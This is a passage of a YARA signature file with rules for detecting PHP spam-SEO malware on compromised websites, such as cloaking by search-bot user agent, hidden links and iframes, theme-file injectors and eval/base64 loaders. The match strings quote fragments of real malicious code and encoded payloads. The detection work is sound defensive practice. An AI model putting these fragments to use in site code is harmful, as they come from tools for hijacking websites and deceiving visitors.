    condition:
        $trigger and PR00029 and PR06288
}

private rule PR06289 : trigger
{
    strings:
        $ps0 = "eval(window.atob("
    condition:
        $ps0
}

rule php_spamseo_generic_060 : spamseo
{
    strings:
        $trigger = "dmFyIGR5bmFtRWxlbT1mdW5jdGlvbihlL"
    condition:
        $trigger and PR06289
}

rule php_spamseo_generic_061 : spamseo
{
    strings:
        $trigger = "(in_array($_SERVER['REQUEST_URI'], array(\"/\")))"
    condition:
        $trigger and PR00540 and PR00246
}

private rule PR06290 : trigger
{
    strings:
        $ps0 = "echo 'google-site-verification: google'.$_GET['google']"
    condition:
        $ps0
}

rule php_spamseo_google_verification_001 : spamseo
{
    strings:
        $trigger = "if($_GET['uu']"
    condition:
        $trigger and PR06290 and PR00323 and PR00348
}

rule php_spamseo_google_verification_003 : spamseo
{
    strings:
        $trigger = "echo GetFileContent(\"sit"
    condition:
        $trigger and PR06290 and PR00323 and PR00348
}

private rule PR06291 : trigger
{
    strings:
        $ps0 = "if($isClick==\"true\")"
    condition:
        $ps0
}

rule php_spamseo_google_verification_004 : spamseo
{
    strings:
        $trigger = "location"
    condition:
        $trigger and PR06290 and PR00323 and PR06291
}

private rule PR06292 : trigger
{
    strings:
        $ps0 = "echo 'google-site-verification: google'.$_GET['google'].'.html';exit;"
    condition:
        $ps0
}

rule php_spamseo_google_verification_005 : spamseo
{
    strings:
        $trigger = "CURL"
    condition:
        $trigger and PR06292
}

private rule PR06293 : trigger
{
    strings:
        $ps0 = "\\47\\x43\\155\\x6c\\155\\x49\\103\\x67\\150\\x59\\62\\x78\\150\\x63\\63\\x4e\\146\\x5a\\130\\x68\\160\\x63\\63\\x52\\172\\x4b\\103\\x64\\156\\x63\\155\\x46\\167\\x5a\\130\\x5a\\160"
    condition:
        $ps0
}

rule php_spamseo_grapevine_001 : spamseo
{
    strings:
        $trigger = "@preg_replace(\"@(.+)@ie\", \"\\x65\\166\\x61\\154\\x28"
    condition:
        $trigger and PR06293
}

rule php_spamseo_header_location_009 : spamseo
{
    strings:
        $trigger = "if (isset($_GET['jpg']))"
    condition:
        $trigger
}

private rule PR06294 : trigger
{
    strings:
        $ps0 = "=array(101,114,114,111,114,95,114"
    condition:
        $ps0
}

rule php_spamseo_header_location_021 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06294
}

private rule PR06295 : trigger
{
    strings:
        $ps0 = "$_SERVER[\"REMOTE_ADDR\"]))$isbot = 1;"
    condition:
        $ps0
}

rule php_spamseo_header_location_022 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR06295 and PR00070
}

private rule PR06296 : trigger
{
    strings:
        $ps0 = "=false)header("
    condition:
        $ps0
}

private rule PR06297 : trigger
{
    strings:
        $ps0 = "=http_build_query("
    condition:
        $ps0
}

rule php_spamseo_header_location_023 : spamseo
{
    strings:
        $trigger = "=&$_COOKIE;$"
    condition:
        $trigger and PR06296 and PR06297 and PR01700
}

rule php_spamseo_header_location_024 : spamseo
{
    strings:
        $trigger = "$sh=='127.0.1.5"
    condition:
        $trigger and PR00070 and PR02451
}

// MANUAL FIX NECESSARY
rule php_spamseo_header_location_025 : spamseo
{
    strings:
        $trigger = "header(\"Location:"
        $php_spamseo_header_location_025_r0 = /\t{20}header\(\"Location:[^;]+;/
    condition:
        $trigger and $php_spamseo_header_location_025_r0
}

private rule PR06298 : trigger
{
    strings:
        $ps0 = "){header(\"Location: \".pack("
    condition:
        $ps0
}

rule php_spamseo_header_location_026 : spamseo
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR06298
}

rule php_spamseo_header_location_027 : spamseo
{
    strings:
        $trigger = "] * $_POST["
    condition:
        $trigger and PR05449 and PR01746 and PR01490
}

private rule PR06299 : trigger
{
    strings:
        $ps0 = "header(\"Location: $urlz[0].$"
    condition:
        $ps0
}

rule php_spamseo_header_location_028 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06299 and PR00355 and PR00357
}

private rule PR06300 : trigger
{
    strings:
        $ps0 = "= isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT'])"
    condition:
        $ps0
}

rule php_spamseo_header_location_030 : spamseo
{
    strings:
        $trigger = "header('Location: '.$location,"
    condition:
        $trigger and PR06300 and PR01382
}

private rule PR06301 : trigger
{
    strings:
        $ps0 = "if (preg_match(\"/googlebot/i\",  $_SERVER[\"HTTP_USER_AGENT\"]"
    condition:
        $ps0
}

rule php_spamseo_header_location_031 : spamseo
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR06301
}

rule php_spamseo_header_location_032 : spamseo
{
    strings:
        $trigger = "header('Location: ' . $"
    condition:
        $trigger and PR04788 and PR00357 and PR01431
}

private rule PR06302 : trigger
{
    strings:
        $ps0 = "header(\"Location: http"
    condition:
        $ps0
}

rule php_spamseo_header_location_033 : spamseo
{
    strings:
        $trigger = "urldecode($_GET["
    condition:
        $trigger and PR01665 and PR06302
}

private rule PR06303 : trigger
{
    strings:
        $ps0 = "top: -"
    condition:
        $ps0
}

private rule PR06304 : trigger
{
    strings:
        $ps0 = "$result = file_get_contents($url);"
    condition:
        $ps0
}

private rule PR06305 : trigger
{
    strings:
        $ps0 = "left: -"
    condition:
        $ps0
}

private rule PR06306 : trigger
{
    strings:
        $ps0 = "echo $result;"
    condition:
        $ps0
}

private rule PR06307 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch, CURLOPT_URL, $url);"
    condition:
        $ps0
}

private rule PR06308 : trigger
{
    strings:
        $ps0 = "absolute;"
    condition:
        $ps0
}

rule php_spamseo_hiddendiv_005 : spamseo
{
    strings:
        $trigger = "if (function_exists('file_get_contents"
    condition:
        $trigger and PR06303 and PR06304 and PR06305 and PR06306 and PR06307 and PR06308
}

rule php_spamseo_hiddendiv_006 : spamseo
{
    strings:
        $trigger = "text/javascript\">document.write(\"<\\/div>\")</script>"
    condition:
        $trigger and PR00050
}

private rule PR06309 : trigger
{
    strings:
        $ps0 = "echo '<div style=\"position: absolute;"
    condition:
        $ps0
}

rule php_spamseo_hiddendiv_007 : spamseo
{
    strings:
        $trigger = "px; text-align:center;\"><a style=\"text-decoration:none;\" href="
    condition:
        $trigger and PR06309
}

private rule PR06310 : trigger
{
    strings:
        $ps0 = "print '<div class="
    condition:
        $ps0
}

rule php_spamseo_hiddendiv_008 : spamseo
{
    strings:
        $trigger = "if (!isset($_SERVER['REQUEST_URI']) || ltrim($_SERVER['REQUEST_URI"
    condition:
        $trigger and PR06310
}

private rule PR06311 : trigger
{
    strings:
        $ps0 = "if (strpos ($spide , 'googl"
    condition:
        $ps0
}

rule php_spamseo_hiddendiv_009 : spamseo
{
    strings:
        $trigger = "echo <<<EOT"
    condition:
        $trigger and PR00510 and PR06311
}

rule php_spamseo_hiddendiv_011 : spamseo
{
    strings:
        $trigger = "array_push($links[count($links)"
    condition:
        $trigger
}

private rule PR06312 : trigger
{
    strings:
        $ps0 = "if((strpos($tmp, 'bot') == true)){"
    condition:
        $ps0
}

rule php_spamseo_hiddendiv_012 : spamseo
{
    strings:
        $trigger = "strtolower($_SERVER['HTTP_USER_AGENT']);"
    condition:
        $trigger and PR06312
}

private rule PR06313 : trigger
{
    strings:
        $ps0 = "GET /{$file} HTTP"
    condition:
        $ps0
}

rule php_spamseo_hiddendiv_013 : spamseo
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03969 and PR06313
}

rule php_spamseo_hiddendiv_014 : spamseo
{
    strings:
        $trigger = ";})(351+814*20,'play','one',document);"
    condition:
        $trigger and PR00540 and PR00050 and PR00541
}

private rule PR06314 : trigger
{
    strings:
        $ps0 = "<div style=\"display:none;"
    condition:
        $ps0
}

rule php_spamseo_hiddendiv_015 : spamseo
{
    strings:
        $trigger = "if (in_array($_SERVER['REQUEST_URI'], array("
    condition:
        $trigger and PR06314 and PR00246
}

private rule PR06315 : trigger
{
    strings:
        $ps0 = ".style.display=\"no\" + \"ne\""
    condition:
        $ps0
}

rule php_spamseo_hiddendiv_016 : spamseo
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR06315 and PR00050 and PR00237
}

private rule PR06316 : trigger
{
    strings:
        $ps0 = "base64_decode(\"PHAgc3R5bGU9Im92ZXJmbG93OiB"
    condition:
        $ps0
}

rule php_spamseo_hiddenlinks_003 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06316
}

rule php_spamseo_hiddenlinks_004 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('Dc+3kqNIAADQz9mZ6kBAY2sjhBES3pvkCu+9EfD1t/lLXn7E3U9510PRxVv+k8RrTuL/ZX"
    condition:
        $trigger
}

private rule PR06317 : trigger
{
    strings:
        $ps0 = "=$_SERVER['REQUEST_URI']"
    condition:
        $ps0
}

private rule PR06318 : trigger
{
    strings:
        $ps0 = "&& !empty($ip) && !empty($useragent"
    condition:
        $ps0
}

rule php_spamseo_hiddenlinks_005 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06317 and PR06318 and PR01543
}

private rule PR06319 : trigger
{
    strings:
        $ps0 = "if (!empty($agent)) {"
    condition:
        $ps0
}

private rule PR06320 : trigger
{
    strings:
        $ps0 = "if (strpos($"
    condition:
        $ps0
}

rule php_spamseo_hiddenlinks_006 : spamseo
{
    strings:
        $trigger = "<a href"
    condition:
        $trigger and PR06319 and PR02163 and PR04816 and PR06320
}

private rule PR06321 : trigger
{
    strings:
        $ps0 = "function get_next_link"
    condition:
        $ps0
}

rule php_spamseo_hiddenlinks_006_02 : spamseo
{
    strings:
        $trigger = "@gethostbyaddr($localIp);"
    condition:
        $trigger and PR02163 and PR01209 and PR04816 and PR06319 and PR06321
}

private rule PR06322 : trigger
{
    strings:
        $ps0 = "$plugin_info[SIMPLEPIE_CONSTRUCT_TEXT].SIMPLEPIE_NAMESPACE_XHTML"
    condition:
        $ps0
}

rule php_spamseo_hiddenlinks_006_03 : spamseo
{
    strings:
        $trigger = "<a href"
    condition:
        $trigger and PR06322 and PR06319 and PR02163 and PR04816
}

rule php_spamseo_hiddenlinks_007 : spamseo
{
    strings:
        $trigger = "if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), \"google\"))"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_spamseo_hiddenlinks_009 : spamseo
{
    strings:
        $trigger = "PGRpdiBzdHlsZT0icG9zaXRpb"
        $php_spamseo_hiddenlinks_009_r0 = /<\?php[\s]*@?eval/
    condition:
        $trigger and PR00029 and $php_spamseo_hiddenlinks_009_r0
}

rule php_spamseo_hiddenstyle_003 : spamseo
{
    strings:
        $trigger = ",\"\\x64\\x69\\x73\\x70\\x6C\\x61\\x79\",\"\\x6E\\x6F\\x6E\\x65\"];if(!navigator.userAgent.match(/google|bot|spider/i)) document[_0x"
    condition:
        $trigger
}

rule php_spamseo_iframer_002 : spamseo
{
    strings:
        $trigger = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOy"
    condition:
        $trigger and PR01479 and PR01877
}

// MANUAL FIX NECESSARY
private rule PR06323 : trigger
{
    strings:
        $ps0 = "add_filter("
    condition:
        $ps0
}

rule php_spamseo_iframer_002_02 : spamseo
{
    strings:
        $trigger = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOy"
        $php_spamseo_iframer_002_02_r0 = /function [\w]+\(\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*.PGRpdi/
    condition:
        $trigger and PR01479 and PR06323 and PR01877 and $php_spamseo_iframer_002_02_r0
}

private rule PR06324 : trigger
{
    strings:
        $ps0 = "echo(' <iframe src"
    condition:
        $ps0
}

rule php_spamseo_iframer_003 : spamseo
{
    strings:
        $trigger = "= @file($way);"
    condition:
        $trigger and PR06324
}

private rule PR06325 : trigger
{
    strings:
        $ps0 = "|strpos($url,'.bing.')||strpos($url,'.yahoo.')){"
    condition:
        $ps0
}

private rule PR06326 : trigger
{
    strings:
        $ps0 = "=rand("
    condition:
        $ps0
}

private rule PR06327 : trigger
{
    strings:
        $ps0 = "{echo \"<script type=\\\"text/javascript\\\"> window.location.href="
    condition:
        $ps0
}

rule php_spamseo_iframer_004 : spamseo
{
    strings:
        $trigger = "parseInt(c/a)))+((c=c%a)"
    condition:
        $trigger and PR00604 and PR06325 and PR06326 and PR06327
}

rule php_spamseo_iframer_006 : spamseo
{
    strings:
        $trigger = "print '<iframe style=\"position:absolute;top:-999em;left:-999em;\" scrolling=\"no\" src=\"'.$"
    condition:
        $trigger and PR01710 and PR01524
}

// MANUAL FIX NECESSARY
rule php_spamseo_iframer_007 : spamseo
{
    strings:
        $trigger = "ocument.write"
        $php_spamseo_iframer_007_r0 = /url[\s]*=[\s]*.https?:[^;]+;[\s]*([\w]+[\s]*=[^\n]+;[\s]*){4,}document\.write[\s]*\([\w]+\);[\s]*document\.write[\s]*\([\w]+\);/
    condition:
        $trigger and PR04286 and $php_spamseo_iframer_007_r0
}

rule php_spamseo_iho_001 : spamseo
{
    strings:
        $trigger = "proud ofOmar5200 has much to be proud ofOmar5200"
    condition:
        $trigger and PR00080 and PR00113
}

private rule PR06328 : trigger
{
    strings:
        $ps0 = ");} $"
    condition:
        $ps0
}

private rule PR06329 : trigger
{
    strings:
        $ps0 = ".'));'); $"
    condition:
        $ps0
}

rule php_spamseo_infector_002 : spamseo
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR06328 and PR06329
}

rule php_spamseo_infector_002_02 : spamseo
{
    strings:
        $trigger = "','',$"
    condition:
        $trigger and PR06329 and PR01480
}

rule php_spamseo_infector_002_03 : spamseo
{
    strings:
        $trigger = "@ini_set('log_errors',0);"
    condition:
        $trigger and PR01480 and PR06328 and PR01789 and PR06329
}

rule php_spamseo_infector_003 : spamseo
{
    strings:
        $trigger = "(s(base64_decode('HyqWB2KC"
    condition:
        $trigger
}

rule php_spamseo_infector_004 : spamseo
{
    strings:
        $trigger = "$file_new_data = $sape_start_marker.$code_inject_sape.$sape_end_marker.$file_new_data;"
    condition:
        $trigger
}

private rule PR06330 : trigger
{
    strings:
        $ps0 = "(implode('', $"
    condition:
        $ps0
}

rule php_spamseo_infector_005 : spamseo
{
    strings:
        $trigger = "];eval($"
    condition:
        $trigger and PR06330
}

private rule PR06331 : trigger
{
    strings:
        $ps0 = "strpos( preg_replace( $user_agent_to_filter,"
    condition:
        $ps0
}

private rule PR06332 : trigger
{
    strings:
        $ps0 = "$in = fopen(\"wp-content/themes/$dir/header.php\", \"a\");"
    condition:
        $ps0
}

rule php_spamseo_infector_006 : spamseo
{
    strings:
        $trigger = "fwrite($in, $code);"
    condition:
        $trigger and PR06331 and PR00080 and PR06332
}

rule php_spamseo_infector_007 : spamseo
{
    strings:
        $trigger = "file_put_contents($dirPath, base64_decode(substr($content->meta_value,"
    condition:
        $trigger and PR01330
}

rule php_spamseo_infector_008 : spamseo
{
    strings:
        $trigger = "return \"ok\";}else{return \"true\";}}else return \"false\";}if(file_exists($_SERVER["
    condition:
        $trigger and PR00435 and PR02836
}

rule php_spamseo_infector_009 : spamseo
{
    strings:
        $trigger = "@eval(base64_decode('QG9iX3N0YXJ0KCk7QHNldF90aW1lX2xpbWl0KDM2MDApO0Bz"
    condition:
        $trigger
}

private rule PR06333 : trigger
{
    strings:
        $ps0 = "header($O"
    condition:
        $ps0
}

private rule PR06334 : trigger
{
    strings:
        $ps0 = "echo $O"
    condition:
        $ps0
}

rule php_spamseo_infector_010 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06333 and PR04224 and PR00355 and PR01392 and PR06334 and PR00357
}

rule php_spamseo_injection_093 : spamseo
{
    strings:
        $trigger = "var re=/((wd|q|w|p|query)(=)([%A-Z0-9]*)(louis vuitton)"
    condition:
        $trigger and PR00050
}

private rule PR06335 : trigger
{
    strings:
        $ps0 = "do_actions_wp("
    condition:
        $ps0
}

rule php_spamseo_injection_094 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06335
}

rule php_spamseo_injection_095 : spamseo
{
    strings:
        $trigger = "public/js/wp_js.js\">"
    condition:
        $trigger and PR00050
}

private rule PR06336 : trigger
{
    strings:
        $ps0 = "else {if(is_page()||is_single()){"
    condition:
        $ps0
}

rule php_spamseo_injection_097 : spamseo
{
    strings:
        $trigger = "\\x3c\\144\\151\\x76\\40\\163"
    condition:
        $trigger and PR06336
}

private rule PR06337 : trigger
{
    strings:
        $ps0 = "\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x6B\\x6A\\x7A\\x30\\x72"
    condition:
        $ps0
}

rule php_spamseo_injection_098 : spamseo
{
    strings:
        $trigger = "var _"
    condition:
        $trigger and PR06337
}

private rule PR06338 : trigger
{
    strings:
        $ps0 = "'Yahoo! Slurp') !== false){"
    condition:
        $ps0
}

private rule PR06339 : trigger
{
    strings:
        $ps0 = "'google') !=="
    condition:
        $ps0
}

rule php_spamseo_injection_099 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR06338 and PR00070 and PR06339
}

rule php_spamseo_injection_100 : spamseo
{
    strings:
        $trigger = "print(base64_decode(\"PGlmcmFtZSBzY3JvbGxpbmc9I"
    condition:
        $trigger
}

private rule PR06340 : trigger
{
    strings:
        $ps0 = "PGh0bWw+DQoNCg0KPGltZyB1c2VtYXA9IiN"
    condition:
        $ps0
}

rule php_spamseo_injection_101 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06340 and PR01877
}

private rule PR06341 : trigger
{
    strings:
        $ps0 = "strtolower($_SERVER['HTTP_USER_AGENT']);if (strpos"
    condition:
        $ps0
}

rule php_spamseo_injection_102 : spamseo
{
    strings:
        $trigger = "'google') !=="
    condition:
        $trigger and PR06341 and PR00070
}

private rule PR06342 : trigger
{
    strings:
        $ps0 = "PGlmcmFtZSBzcmM9Imh0dHBz"
    condition:
        $ps0
}

rule php_spamseo_injection_103 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06342 and PR01877
}

rule php_spamseo_injection_104 : spamseo
{
    strings:
        $trigger = "<?php echo chr(32).chr(32).chr(32).chr(32).chr(32)"
    condition:
        $trigger
}

private rule PR06343 : trigger
{
    strings:
        $ps0 = "ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uICgpIHt2YXIg"
    condition:
        $ps0
}

rule php_spamseo_injection_105 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR01877 and PR06343
}

private rule PR06344 : trigger
{
    strings:
        $ps0 = "?![]:!![];};function"
    condition:
        $ps0
}

private rule PR06345 : trigger
{
    strings:
        $ps0 = ";while(!![]){try{var"
    condition:
        $ps0
}

rule php_spamseo_injection_106 : spamseo
{
    strings:
        $trigger = ";for(var"
    condition:
        $trigger and PR06344 and PR00323 and PR06345
}

rule php_spamseo_injector_001_012 : spamseo
{
    strings:
        $trigger = "require_once(ABSPATH .'wp-includes/'.'pomo/'."
    condition:
        $trigger
}

rule php_spamseo_injector_001_013 : spamseo
{
    strings:
        $trigger = "$art .= \"<li><a href='\".$dir.MyRandc(5).\"/\".replacex($t[0]).\".html'  title='\".$title_txt[$value].\"'>\".$t[0].\"</a></li>\";"
    condition:
        $trigger
}

rule php_spamseo_injector_001_014 : spamseo
{
    strings:
        $trigger = "eval(\"return eval(\\\"$code\\\");"
    condition:
        $trigger
}

rule php_spamseo_injector_002 : spamseo
{
    strings:
        $trigger = "\"(edoced_46esab(lave'));?><?php"
    condition:
        $trigger
}

rule php_spamseo_injector_006_002 : spamseo
{
    strings:
        $trigger = "]=Array(base64_decode('aXAybG9uZw=='),"
    condition:
        $trigger
}

rule php_spamseo_injector_015 : spamseo
{
    strings:
        $trigger = "function __google_analytics_obh ($c){"
    condition:
        $trigger and PR03133
}

private rule PR06346 : trigger
{
    strings:
        $ps0 = "$str = stripslashes('<?php"
    condition:
        $ps0
}

rule php_spamseo_injector_016 : spamseo
{
    strings:
        $trigger = "get_"
    condition:
        $trigger and PR06346
}

rule php_spamseo_injector_017 : spamseo
{
    strings:
        $trigger = "@file_put_contents($file,\"$p::$tvd\\n\",FILE_APPEND);"
    condition:
        $trigger
}

rule php_spamseo_injector_019 : spamseo
{
    strings:
        $trigger = "ikpOyA=\";if"
    condition:
        $trigger and PR01414
}

rule php_spamseo_injector_020 : spamseo
{
    strings:
        $trigger = "preg_replace(\"/s2ylW0wUhSexgWjoGt=Q/e"
    condition:
        $trigger
}

rule php_spamseo_injector_021 : spamseo
{
    strings:
        $trigger = "lZfNbuRGDITvAfIOhuFDclmM"
    condition:
        $trigger and PR00092
}

rule php_spamseo_injector_022 : spamseo
{
    strings:
        $trigger = "archive.org_bot')) {echo '';}"
    condition:
        $trigger
}

rule php_spamseo_injector_023 : spamseo
{
    strings:
        $trigger = "print_err(\"IframeFileDynamic(): inject data_before failed pos=$inject_pos\");"
    condition:
        $trigger and PR02803
}

rule php_spamseo_injector_024 : spamseo
{
    strings:
        $trigger = "echo '<div style=\"position:absolute; top:-'.$r_offset.'px;\">';"
    condition:
        $trigger
}

rule php_spamseo_injector_026 : spamseo
{
    strings:
        $trigger = "if (empty($__var_to_echo) && empty($remote_domain)) {"
    condition:
        $trigger
}

private rule PR06347 : trigger
{
    strings:
        $ps0 = "//LINKBLOCK"
    condition:
        $ps0
}

rule php_spamseo_injector_027 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06347
}

rule php_spamseo_injector_028 : spamseo
{
    strings:
        $trigger = " = \"\\x70\\x61\\x63\\x6b\";"
    condition:
        $trigger
}

rule php_spamseo_injector_028_01 : spamseo
{
    strings:
        $trigger = "if (file_exists($defaultPo) && preg_match('/' . implode('|', $wp_claws"
    condition:
        $trigger
}

rule php_spamseo_injector_032 : spamseo
{
    strings:
        $trigger = "if(file_exists($f) && is_readable($f)) require_once($f);"
    condition:
        $trigger
}

rule php_spamseo_injector_033 : spamseo
{
    strings:
        $trigger = "<?php if(BlockForUsersNotForSearchEngine()):?>"
    condition:
        $trigger and PR02534
}

private rule PR06348 : trigger
{
    strings:
        $ps0 = "$check_data = ('<!--checker_start ');"
    condition:
        $ps0
}

rule php_spamseo_injector_034_02 : spamseo
{
    strings:
        $trigger = "googlebot|msnbot|yahoo|search|bing|ask|indexer"
    condition:
        $trigger and PR06348 and PR01479
}

private rule PR06349 : trigger
{
    strings:
        $ps0 = "echo('<!--checker_start"
    condition:
        $ps0
}

rule php_spamseo_injector_034_03 : spamseo
{
    strings:
        $trigger = "googlebot|msnbot|yahoo|search|bing|ask|indexer"
    condition:
        $trigger and PR01479 and PR06349
}

private rule PR06350 : trigger
{
    strings:
        $ps0 = "decrypt_url"
    condition:
        $ps0
}

rule php_spamseo_injector_034_04 : spamseo
{
    strings:
        $trigger = "googlebot|msnbot|yahoo|search|bing|ask|indexer"
    condition:
        $trigger and PR06348 and PR06350 and PR01479
}

rule php_spamseo_injector_035 : spamseo
{
    strings:
        $trigger = ");return base64_decode($a[$i]);} ?> <?"
    condition:
        $trigger
}

rule php_spamseo_injector_036 : spamseo
{
    strings:
        $trigger = "$pageTxt = $req->request(str_rot13('uggc"
    condition:
        $trigger
}

rule php_spamseo_injector_037 : spamseo
{
    strings:
        $trigger = "wp_vcat,1,3) === 'scr' ){ echo $wp_vcat;"
    condition:
        $trigger
}

rule php_spamseo_injector_038 : spamseo
{
    strings:
        $trigger = "define('DZR', base64_decode"
    condition:
        $trigger and PR03133
}

rule php_spamseo_injector_039 : spamseo
{
    strings:
        $trigger = "$BotredirectUrl = isset($csGlobal['botRedirectUrl']) ? $csGlobal['botRedirectUrl'] : null;"
    condition:
        $trigger
}

rule php_spamseo_injector_042 : spamseo
{
    strings:
        $trigger = "touch($cache_indexes, strtotime($date));"
    condition:
        $trigger
}

rule php_spamseo_injector_044 : spamseo
{
    strings:
        $trigger = "if (!$allow || check_bot_ip($ip) || $agent ) {"
    condition:
        $trigger and PR03964
}

private rule PR06351 : trigger
{
    strings:
        $ps0 = "function check_bot_ip($ip) {"
    condition:
        $ps0
}

rule php_spamseo_injector_044_02 : spamseo
{
    strings:
        $trigger = "foreach"
    condition:
        $trigger and PR06351
}

private rule PR06352 : trigger
{
    strings:
        $ps0 = "<footer><!-- #colophon --></footer>\" ?>"
    condition:
        $ps0
}

private rule PR06353 : trigger
{
    strings:
        $ps0 = "<?php Echo "
    condition:
        $ps0
}

rule php_spamseo_injector_044_03 : spamseo
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR06352 and PR06353
}

rule php_spamseo_injector_045 : spamseo
{
    strings:
        $trigger = "'.$dir_cloak.$url_part.$ext_file,false,$context);"
    condition:
        $trigger
}

rule php_spamseo_injector_045_02 : spamseo
{
    strings:
        $trigger = "if (stristr($host_referer, 'content-is-there.'))"
    condition:
        $trigger
}

private rule PR06354 : trigger
{
    strings:
        $ps0 = "if($is_bot){echo \""
    condition:
        $ps0
}

rule php_spamseo_injector_046 : spamseo
{
    strings:
        $trigger = "($stop_agents_masks as $stop_agents_mask) if(eregi($stop_agents_mask, @$"
    condition:
        $trigger and PR01818 and PR06354
}

private rule PR06355 : trigger
{
    strings:
        $ps0 = "($stop_agents_masks as $stop_agents_mask) if(eregi($stop_agents_mask, @$"
    condition:
        $ps0
}

rule php_spamseo_injector_046_02 : spamseo
{
    strings:
        $trigger = "@base64_decode(\"PHNjcmlwdD5kb2N1bWVudC53cml0ZWxuK"
    condition:
        $trigger and PR01818 and PR06355
}

rule php_spamseo_injector_046_03 : spamseo
{
    strings:
        $trigger = "{@require_once'"
    condition:
        $trigger and PR01818 and PR06355
}

rule php_spamseo_injector_047 : spamseo
{
    strings:
        $trigger = "$arr = @unserialize(base64_decode($_POST['delete_files']));"
    condition:
        $trigger
}

rule php_spamseo_injector_050 : spamseo
{
    strings:
        $trigger = "if(!function_exists('rss_dlbak')){"
    condition:
        $trigger and PR02534
}

private rule PR06356 : trigger
{
    strings:
        $ps0 = "\".str_replace(\" \",\"+\",$_GET[\""
    condition:
        $ps0
}

rule php_spamseo_injector_051 : spamseo
{
    strings:
        $trigger = "CURL"
    condition:
        $trigger and PR06356
}

rule php_spamseo_injector_052 : spamseo
{
    strings:
        $trigger = "$page = do_rand_vario($page); # [[|]]"
    condition:
        $trigger
}

rule php_spamseo_injector_053 : spamseo
{
    strings:
        $trigger = "$ff=fopen($dira.md5('links.txt'),'w');"
    condition:
        $trigger
}

rule php_spamseo_injector_054 : spamseo
{
    strings:
        $trigger = "$file = 'laba.txt';"
    condition:
        $trigger
}

private rule PR06357 : trigger
{
    strings:
        $ps0 = "getElementById(\"t\"+\"g\"+\"s\"+\"i\").style.display='none"
    condition:
        $ps0
}

rule php_spamseo_injector_055 : spamseo
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR06357
}

rule php_spamseo_injector_056 : spamseo
{
    strings:
        $trigger = "key3.id = key2.object_id AND key3.post_content LIKE '%torrent%'\");"
    condition:
        $trigger and PR00080
}

rule php_spamseo_injector_057 : spamseo
{
    strings:
        $trigger = "<?php get_footer(); ?><a style=\"left:-"
    condition:
        $trigger
}

rule php_spamseo_injector_058 : spamseo
{
    strings:
        $trigger = "$url = str_replace('LOCATION: ', '', $decoded['redirect']['headers'][0]);"
    condition:
        $trigger
}

rule php_spamseo_injector_059 : spamseo
{
    strings:
        $trigger = "e\", \"=JojrOlmLLn6KY"
    condition:
        $trigger and PR01818
}

rule php_spamseo_injector_061 : spamseo
{
    strings:
        $trigger = "echo \"<dm_url>http://\".$_SERVER['SERVER_NAME'].$currenturl.$myname.\".php</dm_url>\\n\";"
    condition:
        $trigger
}

rule php_spamseo_injector_062 : spamseo
{
    strings:
        $trigger = "echo \"<dm_url>\".$currenturl.$myname.\".php</dm_url>\\n\";"
    condition:
        $trigger
}

private rule PR06358 : trigger
{
    strings:
        $ps0 = "if($cell_guardian->isBot()){$is_bot = 1;}else{$is_bot = 0;}"
    condition:
        $ps0
}

rule php_spamseo_injector_063 : spamseo
{
    strings:
        $trigger = "googlebot|msnbot|yahoo|search|bing|ask|indexer"
    condition:
        $trigger and PR01479 and PR06358
}

private rule PR06359 : trigger
{
    strings:
        $ps0 = "page"
    condition:
        $ps0
}

rule php_spamseo_injector_065 : spamseo
{
    strings:
        $trigger = ".html\">'.strtolower(trim($keyitems[$keyarr[$i]])).'</a></strong>"
    condition:
        $trigger and PR06359
}

rule php_spamseo_injector_066 : spamseo
{
    strings:
        $trigger = "$shit = @fgets($flog,"
    condition:
        $trigger
}

rule php_spamseo_injector_067 : spamseo
{
    strings:
        $trigger = "$ipcheck = str_replace('<t@k>',\"\",$html);"
    condition:
        $trigger
}

rule php_spamseo_injector_068 : spamseo
{
    strings:
        $trigger = "echo httpcopy(\"http:"
    condition:
        $trigger
}

rule php_spamseo_injector_069 : spamseo
{
    strings:
        $trigger = "stristr($zhizhu_js,'google"
    condition:
        $trigger
}

rule php_spamseo_injector_070 : spamseo
{
    strings:
        $trigger = "$folders =  search_dir( \"wp-content/themes\", true"
    condition:
        $trigger
}

rule php_spamseo_injector_071 : spamseo
{
    strings:
        $trigger = "function ahrefs_chooselinks($links, &$ah) {"
    condition:
        $trigger
}

rule php_spamseo_injector_072 : spamseo
{
    strings:
        $trigger = "$prostyn.= \"<a href=http://\".$host.$urit.str_replace"
    condition:
        $trigger
}

rule php_spamseo_injector_073 : spamseo
{
    strings:
        $trigger = ",\"?bot1\"))&&(!substr_count($"
    condition:
        $trigger
}

rule php_spamseo_injector_074 : spamseo
{
    strings:
